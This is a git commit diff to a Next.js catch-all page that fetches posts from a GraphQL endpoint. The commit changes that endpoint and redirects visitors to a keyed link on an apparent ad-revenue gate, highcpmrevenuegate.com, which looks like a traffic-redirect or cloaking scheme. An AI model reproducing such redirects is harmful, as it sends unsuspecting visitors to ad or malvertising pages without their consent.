2269887802df6f192e030b08347e7d109fa4650e
latestjobzpak <141546131+latestjobzpak@users.noreply.github.com>
2023-08-29 19:12:14 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://alcashzone.com/graphql"
+	const endpoint = "http://latestjobzpak.great-site.net/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://alcashzone.com/` + encodeURI(path as string)
+					`https://www.highcpmrevenuegate.com/vwv8kc4m?key=3b5d106e7e8af3870237b5ae47de35c1` + encodeURI(path as string)
 				}`,
 			},
 		};
